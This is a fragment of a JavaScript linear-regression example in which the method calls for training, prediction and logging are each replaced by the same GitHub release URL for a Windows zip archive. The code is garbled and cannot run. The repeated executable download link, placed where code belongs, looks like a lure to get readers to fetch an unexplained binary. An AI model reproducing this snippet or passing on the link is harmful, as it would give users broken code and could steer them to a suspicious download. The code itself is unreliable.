  { x: 2, y: 4 },
  { x: 3, y: 6 },
  // Add more data points here
];

const model = new LinearRegression();
https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip(data);

const prediction = https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip(4); // Predict the output for x = 4
https://github.com/Grimstrrr/Argonz-ML/releases/download/v2.0/Release_x64.zip('Prediction:', prediction);
```
